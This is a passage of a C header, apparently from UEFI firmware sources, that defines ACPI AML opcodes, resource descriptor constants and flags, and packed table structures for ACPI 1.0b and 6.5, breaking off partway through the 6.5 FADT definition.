#define AML_NAME_CHAR_V            0x56
#define AML_NAME_CHAR_W            0x57
#define AML_NAME_CHAR_X            0x58
#define AML_NAME_CHAR_Y            0x59
#define AML_NAME_CHAR_Z            0x5a
#define AML_ROOT_CHAR              0x5c
#define AML_PARENT_PREFIX_CHAR     0x5e
#define AML_NAME_CHAR__            0x5f
#define AML_LOCAL0                 0x60
#define AML_LOCAL1                 0x61
#define AML_LOCAL2                 0x62
#define AML_LOCAL3                 0x63
#define AML_LOCAL4                 0x64
#define AML_LOCAL5                 0x65
#define AML_LOCAL6                 0x66
#define AML_LOCAL7                 0x67
#define AML_ARG0                   0x68
#define AML_ARG1                   0x69
#define AML_ARG2                   0x6a
#define AML_ARG3                   0x6b
#define AML_ARG4                   0x6c
#define AML_ARG5                   0x6d
#define AML_ARG6                   0x6e
#define AML_STORE_OP               0x70
#define AML_REF_OF_OP              0x71
#define AML_ADD_OP                 0x72
#define AML_CONCAT_OP              0x73
#define AML_SUBTRACT_OP            0x74
#define AML_INCREMENT_OP           0x75
#define AML_DECREMENT_OP           0x76
#define AML_MULTIPLY_OP            0x77
#define AML_DIVIDE_OP              0x78
#define AML_SHIFT_LEFT_OP          0x79
#define AML_SHIFT_RIGHT_OP         0x7a
#define AML_AND_OP                 0x7b
#define AML_NAND_OP                0x7c
#define AML_OR_OP                  0x7d
#define AML_NOR_OP                 0x7e
#define AML_XOR_OP                 0x7f
#define AML_NOT_OP                 0x80
#define AML_FIND_SET_LEFT_BIT_OP   0x81
#define AML_FIND_SET_RIGHT_BIT_OP  0x82
#define AML_DEREF_OF_OP            0x83
#define AML_CONCAT_RES_OP          0x84
#define AML_MOD_OP                 0x85
#define AML_NOTIFY_OP              0x86
#define AML_SIZE_OF_OP             0x87
#define AML_INDEX_OP               0x88
#define AML_MATCH_OP               0x89
#define AML_CREATE_DWORD_FIELD_OP  0x8a
#define AML_CREATE_WORD_FIELD_OP   0x8b
#define AML_CREATE_BYTE_FIELD_OP   0x8c
#define AML_CREATE_BIT_FIELD_OP    0x8d
#define AML_OBJECT_TYPE_OP         0x8e
#define AML_CREATE_QWORD_FIELD_OP  0x8f
#define AML_LAND_OP                0x90
#define AML_LOR_OP                 0x91
#define AML_LNOT_OP                0x92
#define AML_LEQUAL_OP              0x93
#define AML_LGREATER_OP            0x94
#define AML_LLESS_OP               0x95
#define AML_TO_BUFFER_OP           0x96
#define AML_TO_DEC_STRING_OP       0x97
#define AML_TO_HEX_STRING_OP       0x98
#define AML_TO_INTEGER_OP          0x99
#define AML_TO_STRING_OP           0x9c
#define AML_COPY_OBJECT_OP         0x9d
#define AML_MID_OP                 0x9e
#define AML_CONTINUE_OP            0x9f
#define AML_IF_OP                  0xa0
#define AML_ELSE_OP                0xa1
#define AML_WHILE_OP               0xa2
#define AML_NOOP_OP                0xa3
#define AML_RETURN_OP              0xa4
#define AML_BREAK_OP               0xa5
#define AML_BREAK_POINT_OP         0xcc
#define AML_ONES_OP                0xff

//
// Extended OpCode
//
#define AML_EXT_OP  0x5b

#define AML_EXT_MUTEX_OP         0x01
#define AML_EXT_EVENT_OP         0x02
#define AML_EXT_COND_REF_OF_OP   0x12
#define AML_EXT_CREATE_FIELD_OP  0x13
#define AML_EXT_LOAD_TABLE_OP    0x1f
#define AML_EXT_LOAD_OP          0x20
#define AML_EXT_STALL_OP         0x21
#define AML_EXT_SLEEP_OP         0x22
#define AML_EXT_ACQUIRE_OP       0x23
#define AML_EXT_SIGNAL_OP        0x24
#define AML_EXT_WAIT_OP          0x25
#define AML_EXT_RESET_OP         0x26
#define AML_EXT_RELEASE_OP       0x27
#define AML_EXT_FROM_BCD_OP      0x28
#define AML_EXT_TO_BCD_OP        0x29
#define AML_EXT_UNLOAD_OP        0x2a
#define AML_EXT_REVISION_OP      0x30
#define AML_EXT_DEBUG_OP         0x31
#define AML_EXT_FATAL_OP         0x32
#define AML_EXT_TIMER_OP         0x33
#define AML_EXT_REGION_OP        0x80
#define AML_EXT_FIELD_OP         0x81
#define AML_EXT_DEVICE_OP        0x82
#define AML_EXT_PROCESSOR_OP     0x83
#define AML_EXT_POWER_RES_OP     0x84
#define AML_EXT_THERMAL_ZONE_OP  0x85
#define AML_EXT_INDEX_FIELD_OP   0x86
#define AML_EXT_BANK_FIELD_OP    0x87
#define AML_EXT_DATA_REGION_OP   0x88

//
// FieldElement OpCode
//
#define AML_FIELD_RESERVED_OP    0x00
#define AML_FIELD_ACCESS_OP      0x01
#define AML_FIELD_CONNECTION_OP  0x02
#define AML_FIELD_EXT_ACCESS_OP  0x03

//
// AML Name segment definitions
//
#define AML_NAME_SEG_SIZE  4

///
/// Common table header, this prefaces all ACPI tables, including FACS, but
/// excluding the RSD PTR structure.
///
typedef struct {
    UINT32    Signature;
    UINT32    Length;
} EFI_ACPI_COMMON_HEADER;

#pragma pack(1)
///
/// The common ACPI description table header.  This structure prefaces most ACPI tables.
///
typedef struct {
    UINT32    Signature;
    UINT32    Length;
    UINT8     Revision;
    UINT8     Checksum;
    UINT8     OemId[6];
    UINT64    OemTableId;
    UINT32    OemRevision;
    UINT32    CreatorId;
    UINT32    CreatorRevision;
} EFI_ACPI_DESCRIPTION_HEADER;
#pragma pack()

//
// Define for Descriptor
//
#define ACPI_SMALL_ITEM_FLAG  0x00
#define ACPI_LARGE_ITEM_FLAG  0x01

//
// Small Item Descriptor Name
//
#define ACPI_SMALL_IRQ_DESCRIPTOR_NAME              0x04
#define ACPI_SMALL_DMA_DESCRIPTOR_NAME              0x05
#define ACPI_SMALL_START_DEPENDENT_DESCRIPTOR_NAME  0x06
#define ACPI_SMALL_END_DEPENDENT_DESCRIPTOR_NAME    0x07
#define ACPI_SMALL_IO_PORT_DESCRIPTOR_NAME          0x08
#define ACPI_SMALL_FIXED_IO_PORT_DESCRIPTOR_NAME    0x09
#define ACPI_SMALL_VENDOR_DEFINED_DESCRIPTOR_NAME   0x0E
#define ACPI_SMALL_END_TAG_DESCRIPTOR_NAME          0x0F

//
// Large Item Descriptor Name
//
#define ACPI_LARGE_24_BIT_MEMORY_RANGE_DESCRIPTOR_NAME        0x01
#define ACPI_LARGE_VENDOR_DEFINED_DESCRIPTOR_NAME             0x04
#define ACPI_LARGE_32_BIT_MEMORY_RANGE_DESCRIPTOR_NAME        0x05
#define ACPI_LARGE_32_BIT_FIXED_MEMORY_RANGE_DESCRIPTOR_NAME  0x06
#define ACPI_LARGE_DWORD_ADDRESS_SPACE_DESCRIPTOR_NAME        0x07
#define ACPI_LARGE_WORD_ADDRESS_SPACE_DESCRIPTOR_NAME         0x08
#define ACPI_LARGE_EXTENDED_IRQ_DESCRIPTOR_NAME               0x09
#define ACPI_LARGE_QWORD_ADDRESS_SPACE_DESCRIPTOR_NAME        0x0A

//
// Small Item Descriptor Value
//
#define ACPI_IRQ_NOFLAG_DESCRIPTOR              0x22
#define ACPI_IRQ_DESCRIPTOR                     0x23
#define ACPI_DMA_DESCRIPTOR                     0x2A
#define ACPI_START_DEPENDENT_DESCRIPTOR         0x30
#define ACPI_START_DEPENDENT_EX_DESCRIPTOR      0x31
#define ACPI_END_DEPENDENT_DESCRIPTOR           0x38
#define ACPI_IO_PORT_DESCRIPTOR                 0x47
#define ACPI_FIXED_LOCATION_IO_PORT_DESCRIPTOR  0x4B
#define ACPI_END_TAG_DESCRIPTOR                 0x79

//
// Large Item Descriptor Value
//
#define ACPI_24_BIT_MEMORY_RANGE_DESCRIPTOR        0x81
#define ACPI_32_BIT_MEMORY_RANGE_DESCRIPTOR        0x85
#define ACPI_32_BIT_FIXED_MEMORY_RANGE_DESCRIPTOR  0x86
#define ACPI_DWORD_ADDRESS_SPACE_DESCRIPTOR        0x87
#define ACPI_WORD_ADDRESS_SPACE_DESCRIPTOR         0x88
#define ACPI_EXTENDED_INTERRUPT_DESCRIPTOR         0x89
#define ACPI_QWORD_ADDRESS_SPACE_DESCRIPTOR        0x8A
#define ACPI_ADDRESS_SPACE_DESCRIPTOR              0x8A

//
// Resource Type
//
#define ACPI_ADDRESS_SPACE_TYPE_MEM  0x00
#define ACPI_ADDRESS_SPACE_TYPE_IO   0x01
#define ACPI_ADDRESS_SPACE_TYPE_BUS  0x02

///
/// Power Management Timer frequency is fixed at 3.579545MHz.
///
#define ACPI_TIMER_FREQUENCY  3579545

//
// Ensure proper structure formats
//
#pragma pack(1)

///
/// The common definition of QWORD, DWORD, and WORD
/// Address Space Descriptors.
///
typedef struct {
    UINT8     Desc;
    UINT16    Len;
    UINT8     ResType;
    UINT8     GenFlag;
    UINT8     SpecificFlag;
    UINT64    AddrSpaceGranularity;
    UINT64    AddrRangeMin;
    UINT64    AddrRangeMax;
    UINT64    AddrTranslationOffset;
    UINT64    AddrLen;
} EFI_ACPI_ADDRESS_SPACE_DESCRIPTOR;

typedef union {
    UINT8    Byte;
    struct {
        UINT8    Length : 3;
        UINT8    Name : 4;
        UINT8    Type : 1;
    } Bits;
} ACPI_SMALL_RESOURCE_HEADER;

typedef struct {
    union {
        UINT8    Byte;
        struct {
            UINT8    Name : 7;
            UINT8    Type : 1;
        } Bits;
    } Header;
    UINT16    Length;
} ACPI_LARGE_RESOURCE_HEADER;

///
/// IRQ Descriptor.
///
typedef struct {
    ACPI_SMALL_RESOURCE_HEADER    Header;
    UINT16                        Mask;
} EFI_ACPI_IRQ_NOFLAG_DESCRIPTOR;

///
/// IRQ Descriptor.
///
typedef struct {
    ACPI_SMALL_RESOURCE_HEADER    Header;
    UINT16                        Mask;
    UINT8                         Information;
} EFI_ACPI_IRQ_DESCRIPTOR;

///
/// DMA Descriptor.
///
typedef struct {
    ACPI_SMALL_RESOURCE_HEADER    Header;
    UINT8                         ChannelMask;
    UINT8                         Information;
} EFI_ACPI_DMA_DESCRIPTOR;

///
/// I/O Port Descriptor
///
typedef struct {
    ACPI_SMALL_RESOURCE_HEADER    Header;
    UINT8                         Information;
    UINT16                        BaseAddressMin;
    UINT16                        BaseAddressMax;
    UINT8                         Alignment;
    UINT8                         Length;
} EFI_ACPI_IO_PORT_DESCRIPTOR;

///
/// Fixed Location I/O Port Descriptor.
///
typedef struct {
    ACPI_SMALL_RESOURCE_HEADER    Header;
    UINT16                        BaseAddress;
    UINT8                         Length;
} EFI_ACPI_FIXED_LOCATION_IO_PORT_DESCRIPTOR;

///
/// 24-Bit Memory Range Descriptor
///
typedef struct {
    ACPI_LARGE_RESOURCE_HEADER    Header;
    UINT8                         Information;
    UINT16                        BaseAddressMin;
    UINT16                        BaseAddressMax;
    UINT16                        Alignment;
    UINT16                        Length;
} EFI_ACPI_24_BIT_MEMORY_RANGE_DESCRIPTOR;

///
/// 32-Bit Memory Range Descriptor
///
typedef struct {
    ACPI_LARGE_RESOURCE_HEADER    Header;
    UINT8                         Information;
    UINT32                        BaseAddressMin;
    UINT32                        BaseAddressMax;
    UINT32                        Alignment;
    UINT32                        Length;
} EFI_ACPI_32_BIT_MEMORY_RANGE_DESCRIPTOR;

///
/// Fixed 32-Bit Fixed Memory Range Descriptor
///
typedef struct {
    ACPI_LARGE_RESOURCE_HEADER    Header;
    UINT8                         Information;
    UINT32                        BaseAddress;
    UINT32                        Length;
} EFI_ACPI_32_BIT_FIXED_MEMORY_RANGE_DESCRIPTOR;

///
/// QWORD Address Space Descriptor
///
typedef struct {
    ACPI_LARGE_RESOURCE_HEADER    Header;
    UINT8                         ResType;
    UINT8                         GenFlag;
    UINT8                         SpecificFlag;
    UINT64                        AddrSpaceGranularity;
    UINT64                        AddrRangeMin;
    UINT64                        AddrRangeMax;
    UINT64                        AddrTranslationOffset;
    UINT64                        AddrLen;
} EFI_ACPI_QWORD_ADDRESS_SPACE_DESCRIPTOR;

///
/// DWORD Address Space Descriptor
///
typedef struct {
    ACPI_LARGE_RESOURCE_HEADER    Header;
    UINT8                         ResType;
    UINT8                         GenFlag;
    UINT8                         SpecificFlag;
    UINT32                        AddrSpaceGranularity;
    UINT32                        AddrRangeMin;
    UINT32                        AddrRangeMax;
    UINT32                        AddrTranslationOffset;
    UINT32                        AddrLen;
} EFI_ACPI_DWORD_ADDRESS_SPACE_DESCRIPTOR;

///
/// WORD Address Space Descriptor
///
typedef struct {
    ACPI_LARGE_RESOURCE_HEADER    Header;
    UINT8                         ResType;
    UINT8                         GenFlag;
    UINT8                         SpecificFlag;
    UINT16                        AddrSpaceGranularity;
    UINT16                        AddrRangeMin;
    UINT16                        AddrRangeMax;
    UINT16                        AddrTranslationOffset;
    UINT16                        AddrLen;
} EFI_ACPI_WORD_ADDRESS_SPACE_DESCRIPTOR;

///
/// Extended Interrupt Descriptor
///
typedef struct {
    ACPI_LARGE_RESOURCE_HEADER    Header;
    UINT8                         InterruptVectorFlags;
    UINT8                         InterruptTableLength;
    UINT32                        InterruptNumber[1];
} EFI_ACPI_EXTENDED_INTERRUPT_DESCRIPTOR;

#pragma pack()

///
/// The End tag identifies an end of resource data.
///
typedef struct {
    UINT8    Desc;
    UINT8    Checksum;
} EFI_ACPI_END_TAG_DESCRIPTOR;

//
// General use definitions
//
#define EFI_ACPI_RESERVED_BYTE   0x00
#define EFI_ACPI_RESERVED_WORD   0x0000
#define EFI_ACPI_RESERVED_DWORD  0x00000000
#define EFI_ACPI_RESERVED_QWORD  0x0000000000000000

//
// Resource Type Specific Flags
// Ref ACPI specification 6.4.3.5.5
//
// Bit [0]    : Write Status, _RW
//
#define EFI_ACPI_MEMORY_RESOURCE_SPECIFIC_FLAG_READ_WRITE  (1 << 0)
#define EFI_ACPI_MEMORY_RESOURCE_SPECIFIC_FLAG_READ_ONLY   (0 << 0)
//
// Bit [2:1]  : Memory Attributes, _MEM
//
#define EFI_ACPI_MEMORY_RESOURCE_SPECIFIC_FLAG_NON_CACHEABLE              (0 << 1)
#define EFI_ACPI_MEMORY_RESOURCE_SPECIFIC_FLAG_CACHEABLE                  (1 << 1)
#define EFI_ACPI_MEMORY_RESOURCE_SPECIFIC_FLAG_CACHEABLE_WRITE_COMBINING  (2 << 1)
#define EFI_ACPI_MEMORY_RESOURCE_SPECIFIC_FLAG_CACHEABLE_PREFETCHABLE     (3 << 1)
//
// Bit [4:3]  : Memory Attributes, _MTP
//
#define EFI_ACPI_MEMORY_RESOURCE_SPECIFIC_FLAG_ADDRESS_RANGE_MEMORY    (0 << 3)
#define EFI_ACPI_MEMORY_RESOURCE_SPECIFIC_FLAG_ADDRESS_RANGE_RESERVED  (1 << 3)
#define EFI_ACPI_MEMORY_RESOURCE_SPECIFIC_FLAG_ADDRESS_RANGE_ACPI      (2 << 3)
#define EFI_APCI_MEMORY_RESOURCE_SPECIFIC_FLAG_ADDRESS_RANGE_NVS       (3 << 3)
//
// Bit [5]    : Memory to I/O Translation, _TTP
//
#define EFI_ACPI_MEMORY_RESOURCE_SPECIFIC_FLAG_TYPE_TRANSLATION  (1 << 5)
#define EFI_ACPI_MEMORY_RESOURCE_SPECIFIC_FLAG_TYPE_STATIC       (0 << 5)

//
// IRQ Information
// Ref ACPI specification 6.4.2.1
//
#define EFI_ACPI_IRQ_SHARABLE_MASK  0x10
#define   EFI_ACPI_IRQ_SHARABLE     0x10

#define EFI_ACPI_IRQ_POLARITY_MASK  0x08
#define   EFI_ACPI_IRQ_HIGH_TRUE    0x00
#define   EFI_ACPI_IRQ_LOW_FALSE    0x08

#define EFI_ACPI_IRQ_MODE               0x01
#define   EFI_ACPI_IRQ_LEVEL_TRIGGERED  0x00
#define   EFI_ACPI_IRQ_EDGE_TRIGGERED   0x01

//
// DMA Information
// Ref ACPI specification 6.4.2.2
//
#define EFI_ACPI_DMA_SPEED_TYPE_MASK             0x60
#define   EFI_ACPI_DMA_SPEED_TYPE_COMPATIBILITY  0x00
#define   EFI_ACPI_DMA_SPEED_TYPE_A              0x20
#define   EFI_ACPI_DMA_SPEED_TYPE_B              0x40
#define   EFI_ACPI_DMA_SPEED_TYPE_F              0x60

#define EFI_ACPI_DMA_BUS_MASTER_MASK  0x04
#define   EFI_ACPI_DMA_BUS_MASTER     0x04

#define EFI_ACPI_DMA_TRANSFER_TYPE_MASK                0x03
#define   EFI_ACPI_DMA_TRANSFER_TYPE_8_BIT             0x00
#define   EFI_ACPI_DMA_TRANSFER_TYPE_8_BIT_AND_16_BIT  0x01
#define   EFI_ACPI_DMA_TRANSFER_TYPE_16_BIT            0x02

//
// IO Information
// Ref ACPI specification 6.4.2.5
//
#define EFI_ACPI_IO_DECODE_MASK      0x01
#define   EFI_ACPI_IO_DECODE_16_BIT  0x01
#define   EFI_ACPI_IO_DECODE_10_BIT  0x00

//
// Memory Information
// Ref ACPI specification 6.4.3.4
//
#define EFI_ACPI_MEMORY_WRITE_STATUS_MASK  0x01
#define   EFI_ACPI_MEMORY_WRITABLE         0x01
#define   EFI_ACPI_MEMORY_NON_WRITABLE     0x00

//
// Interrupt Vector Flags definitions for Extended Interrupt Descriptor
// Ref ACPI specification 6.4.3.6
//
#define EFI_ACPI_EXTENDED_INTERRUPT_FLAG_PRODUCER_CONSUMER_MASK  BIT0
#define EFI_ACPI_EXTENDED_INTERRUPT_FLAG_MODE_MASK               BIT1
#define EFI_ACPI_EXTENDED_INTERRUPT_FLAG_POLARITY_MASK           BIT2
#define EFI_ACPI_EXTENDED_INTERRUPT_FLAG_SHARABLE_MASK           BIT3
#define EFI_ACPI_EXTENDED_INTERRUPT_FLAG_WAKE_CAPABLITY_MASK     BIT4

//
// Ensure proper structure formats
//
#pragma pack(1)
//
// ACPI 1.0b table structures
//

///
/// Root System Description Pointer Structure.
///
typedef struct {
    UINT64    Signature;
    UINT8     Checksum;
    UINT8     OemId[6];
    UINT8     Reserved;
    UINT32    RsdtAddress;
} EFI_ACPI_1_0_ROOT_SYSTEM_DESCRIPTION_POINTER;

//
// Root System Description Table
// No definition needed as it is a common description table header, the same with
// EFI_ACPI_DESCRIPTION_HEADER, followed by a variable number of UINT32 table pointers.
//

///
/// RSDT Revision (as defined in ACPI 1.0b specification).
///
#define EFI_ACPI_1_0_ROOT_SYSTEM_DESCRIPTION_TABLE_REVISION  0x01

///
/// Fixed ACPI Description Table Structure (FADT).
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         FirmwareCtrl;
    UINT32                         Dsdt;
    UINT8                          IntModel;
    UINT8                          Reserved1;
    UINT16                         SciInt;
    UINT32                         SmiCmd;
    UINT8                          AcpiEnable;
    UINT8                          AcpiDisable;
    UINT8                          S4BiosReq;
    UINT8                          Reserved2;
    UINT32                         Pm1aEvtBlk;
    UINT32                         Pm1bEvtBlk;
    UINT32                         Pm1aCntBlk;
    UINT32                         Pm1bCntBlk;
    UINT32                         Pm2CntBlk;
    UINT32                         PmTmrBlk;
    UINT32                         Gpe0Blk;
    UINT32                         Gpe1Blk;
    UINT8                          Pm1EvtLen;
    UINT8                          Pm1CntLen;
    UINT8                          Pm2CntLen;
    UINT8                          PmTmLen;
    UINT8                          Gpe0BlkLen;
    UINT8                          Gpe1BlkLen;
    UINT8                          Gpe1Base;
    UINT8                          Reserved3;
    UINT16                         PLvl2Lat;
    UINT16                         PLvl3Lat;
    UINT16                         FlushSize;
    UINT16                         FlushStride;
    UINT8                          DutyOffset;
    UINT8                          DutyWidth;
    UINT8                          DayAlrm;
    UINT8                          MonAlrm;
    UINT8                          Century;
    UINT8                          Reserved4;
    UINT8                          Reserved5;
    UINT8                          Reserved6;
    UINT32                         Flags;
} EFI_ACPI_1_0_FIXED_ACPI_DESCRIPTION_TABLE;

///
/// FADT Version (as defined in ACPI 1.0b specification).
///
#define EFI_ACPI_1_0_FIXED_ACPI_DESCRIPTION_TABLE_REVISION  0x01

#define EFI_ACPI_1_0_INT_MODE_DUAL_PIC       0
#define EFI_ACPI_1_0_INT_MODE_MULTIPLE_APIC  1

//
// Fixed ACPI Description Table Fixed Feature Flags
// All other bits are reserved and must be set to 0.
//
#define EFI_ACPI_1_0_WBINVD        BIT0
#define EFI_ACPI_1_0_WBINVD_FLUSH  BIT1
#define EFI_ACPI_1_0_PROC_C1       BIT2
#define EFI_ACPI_1_0_P_LVL2_UP     BIT3
#define EFI_ACPI_1_0_PWR_BUTTON    BIT4
#define EFI_ACPI_1_0_SLP_BUTTON    BIT5
#define EFI_ACPI_1_0_FIX_RTC       BIT6
#define EFI_ACPI_1_0_RTC_S4        BIT7
#define EFI_ACPI_1_0_TMR_VAL_EXT   BIT8
#define EFI_ACPI_1_0_DCK_CAP       BIT9

///
/// Firmware ACPI Control Structure.
///
typedef struct {
    UINT32    Signature;
    UINT32    Length;
    UINT32    HardwareSignature;
    UINT32    FirmwareWakingVector;
    UINT32    GlobalLock;
    UINT32    Flags;
    UINT8     Reserved[40];
} EFI_ACPI_1_0_FIRMWARE_ACPI_CONTROL_STRUCTURE;

///
/// Firmware Control Structure Feature Flags.
/// All other bits are reserved and must be set to 0.
///
#define EFI_ACPI_1_0_S4BIOS_F  BIT0

///
/// Multiple APIC Description Table header definition.  The rest of the table
/// must be defined in a platform-specific manner.
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         LocalApicAddress;
    UINT32                         Flags;
} EFI_ACPI_1_0_MULTIPLE_APIC_DESCRIPTION_TABLE_HEADER;

///
/// MADT Revision (as defined in ACPI 1.0b specification).
///
#define EFI_ACPI_1_0_MULTIPLE_APIC_DESCRIPTION_TABLE_REVISION  0x01

///
/// Multiple APIC Flags
/// All other bits are reserved and must be set to 0.
///
#define EFI_ACPI_1_0_PCAT_COMPAT  BIT0

//
// Multiple APIC Description Table APIC structure types
// All other values between 0x05 an 0xFF are reserved and
// will be ignored by OSPM.
//
#define EFI_ACPI_1_0_PROCESSOR_LOCAL_APIC           0x00
#define EFI_ACPI_1_0_IO_APIC                        0x01
#define EFI_ACPI_1_0_INTERRUPT_SOURCE_OVERRIDE      0x02
#define EFI_ACPI_1_0_NON_MASKABLE_INTERRUPT_SOURCE  0x03
#define EFI_ACPI_1_0_LOCAL_APIC_NMI                 0x04

//
// APIC Structure Definitions
//

///
/// Processor Local APIC Structure Definition.
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     AcpiProcessorId;
    UINT8     ApicId;
    UINT32    Flags;
} EFI_ACPI_1_0_PROCESSOR_LOCAL_APIC_STRUCTURE;

///
/// Local APIC Flags.  All other bits are reserved and must be 0.
///
#define EFI_ACPI_1_0_LOCAL_APIC_ENABLED  BIT0

///
/// IO APIC Structure.
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     IoApicId;
    UINT8     Reserved;
    UINT32    IoApicAddress;
    UINT32    SystemVectorBase;
} EFI_ACPI_1_0_IO_APIC_STRUCTURE;

///
/// Interrupt Source Override Structure.
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     Bus;
    UINT8     Source;
    UINT32    GlobalSystemInterruptVector;
    UINT16    Flags;
} EFI_ACPI_1_0_INTERRUPT_SOURCE_OVERRIDE_STRUCTURE;

///
/// Non-Maskable Interrupt Source Structure.
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT16    Flags;
    UINT32    GlobalSystemInterruptVector;
} EFI_ACPI_1_0_NON_MASKABLE_INTERRUPT_SOURCE_STRUCTURE;

///
/// Local APIC NMI Structure.
///
typedef struct {
    UINT8     Type;
    UINT8     Length;
    UINT8     AcpiProcessorId;
    UINT16    Flags;
    UINT8     LocalApicInti;
} EFI_ACPI_1_0_LOCAL_APIC_NMI_STRUCTURE;

///
/// Smart Battery Description Table (SBST)
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER    Header;
    UINT32                         WarningEnergyLevel;
    UINT32                         LowEnergyLevel;
    UINT32                         CriticalEnergyLevel;
} EFI_ACPI_1_0_SMART_BATTERY_DESCRIPTION_TABLE;

//
// Known table signatures
//

///
/// "RSD PTR " Root System Description Pointer.
///
#define EFI_ACPI_1_0_ROOT_SYSTEM_DESCRIPTION_POINTER_SIGNATURE  SIGNATURE_64('R', 'S', 'D', ' ', 'P', 'T', 'R', ' ')

///
/// "APIC" Multiple APIC Description Table.
///
#define EFI_ACPI_1_0_APIC_SIGNATURE  SIGNATURE_32('A', 'P', 'I', 'C')

///
/// "DSDT" Differentiated System Description Table.
///
#define EFI_ACPI_1_0_DIFFERENTIATED_SYSTEM_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('D', 'S', 'D', 'T')

///
/// "FACS" Firmware ACPI Control Structure.
///
#define EFI_ACPI_1_0_FIRMWARE_ACPI_CONTROL_STRUCTURE_SIGNATURE  SIGNATURE_32('F', 'A', 'C', 'S')

///
/// "FACP" Fixed ACPI Description Table.
///
#define EFI_ACPI_1_0_FIXED_ACPI_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('F', 'A', 'C', 'P')

///
/// "PSDT" Persistent System Description Table.
///
#define EFI_ACPI_1_0_PERSISTENT_SYSTEM_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('P', 'S', 'D', 'T')

///
/// "RSDT" Root System Description Table.
///
#define EFI_ACPI_1_0_ROOT_SYSTEM_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('R', 'S', 'D', 'T')

///
/// "SBST" Smart Battery Specification Table.
///
#define EFI_ACPI_1_0_SMART_BATTERY_SPECIFICATION_TABLE_SIGNATURE  SIGNATURE_32('S', 'B', 'S', 'T')

///
/// "SSDT" Secondary System Description Table.
///
#define EFI_ACPI_1_0_SECONDARY_SYSTEM_DESCRIPTION_TABLE_SIGNATURE  SIGNATURE_32('S', 'S', 'D', 'T')

#pragma pack()


//
// Ensure proper structure formats
//
#pragma pack(1)

///
/// ACPI 6.5 Generic Address Space definition
///
typedef struct {
    UINT8     AddressSpaceId;
    UINT8     RegisterBitWidth;
    UINT8     RegisterBitOffset;
    UINT8     AccessSize;
    UINT64    Address;
} EFI_ACPI_6_5_GENERIC_ADDRESS_STRUCTURE;

//
// Generic Address Space Address IDs
//
#define EFI_ACPI_6_5_SYSTEM_MEMORY                   0x00
#define EFI_ACPI_6_5_SYSTEM_IO                       0x01
#define EFI_ACPI_6_5_PCI_CONFIGURATION_SPACE         0x02
#define EFI_ACPI_6_5_EMBEDDED_CONTROLLER             0x03
#define EFI_ACPI_6_5_SMBUS                           0x04
#define EFI_ACPI_6_5_SYSTEM_CMOS                     0x05
#define EFI_ACPI_6_5_PCI_BAR_TARGET                  0x06
#define EFI_ACPI_6_5_IPMI                            0x07
#define EFI_ACPI_6_5_GENERAL_PURPOSE_IO              0x08
#define EFI_ACPI_6_5_GENERIC_SERIAL_BUS              0x09
#define EFI_ACPI_6_5_PLATFORM_COMMUNICATION_CHANNEL  0x0A
#define EFI_ACPI_6_5_FUNCTIONAL_FIXED_HARDWARE       0x7F

//
// Generic Address Space Access Sizes
//
#define EFI_ACPI_6_5_UNDEFINED  0
#define EFI_ACPI_6_5_BYTE       1
#define EFI_ACPI_6_5_WORD       2
#define EFI_ACPI_6_5_DWORD      3
#define EFI_ACPI_6_5_QWORD      4

//
// ACPI 6.5 table structures
//

///
/// Root System Description Pointer Structure
///
typedef struct {
    UINT64    Signature;
    UINT8     Checksum;
    UINT8     OemId[6];
    UINT8     Revision;
    UINT32    RsdtAddress;
    UINT32    Length;
    UINT64    XsdtAddress;
    UINT8     ExtendedChecksum;
    UINT8     Reserved[3];
} EFI_ACPI_6_5_ROOT_SYSTEM_DESCRIPTION_POINTER;

///
/// RSD_PTR Revision (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_ROOT_SYSTEM_DESCRIPTION_POINTER_REVISION  0x02 ///< ACPISpec (Revision 6.5) says current value is 2

///
/// Common table header, this prefaces all ACPI tables, including FACS, but
/// excluding the RSD PTR structure
///
typedef struct {
    UINT32    Signature;
    UINT32    Length;
} EFI_ACPI_6_5_COMMON_HEADER;

//
// Root System Description Table
// No definition needed as it is a common description table header, the same with
// EFI_ACPI_DESCRIPTION_HEADER, followed by a variable number of UINT32 table pointers.
//

///
/// RSDT Revision (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_ROOT_SYSTEM_DESCRIPTION_TABLE_REVISION  0x01

//
// Extended System Description Table
// No definition needed as it is a common description table header, the same with
// EFI_ACPI_DESCRIPTION_HEADER, followed by a variable number of UINT64 table pointers.
//

///
/// XSDT Revision (as defined in ACPI 6.5 spec.)
///
#define EFI_ACPI_6_5_EXTENDED_SYSTEM_DESCRIPTION_TABLE_REVISION  0x01

///
/// Fixed ACPI Description Table Structure (FADT)
///
typedef struct {
    EFI_ACPI_DESCRIPTION_HEADER               Header;
    UINT32                                    FirmwareCtrl;
    UINT32                                    Dsdt;
    UINT8                                     Reserved0;
    UINT8                                     PreferredPmProfile;
    UINT16                                    SciInt;
    UINT32                                    SmiCmd;
    UINT8                                     AcpiEnable;
    UINT8                                     AcpiDisable;
    UINT8                                     S4BiosReq;
    UINT8                                     PstateCnt;
    UINT32                                    Pm1aEvtBlk;
    UINT32                                    Pm1bEvtBlk;
    UINT32                                    Pm1aCntBlk;
    UINT32                                    Pm1bCntBlk;
    UINT32                                    Pm2CntBlk;
    UINT32                                    PmTmrBlk;
    UINT32                                    Gpe0Blk;
    UINT32                                    Gpe1Blk;
    UINT8                                     Pm1EvtLen;
    UINT8                                     Pm1CntLen;
    UINT8                                     Pm2CntLen;
    UINT8                                     PmTmrLen;
    UINT8                                     Gpe0BlkLen;
    UINT8                                     Gpe1BlkLen;
    UINT8                                     Gpe1Base;
    UINT8                                     CstCnt;
    UINT16                                    PLvl2Lat;
    UINT16                                    PLvl3Lat;
    UINT16                                    FlushSize;
    UINT16                                    FlushStride;
    UINT8                                     DutyOffset;
    UINT8                                     DutyWidth;
    UINT8                                     DayAlrm;
    UINT8                                     MonAlrm;
    UINT8                                     Century;
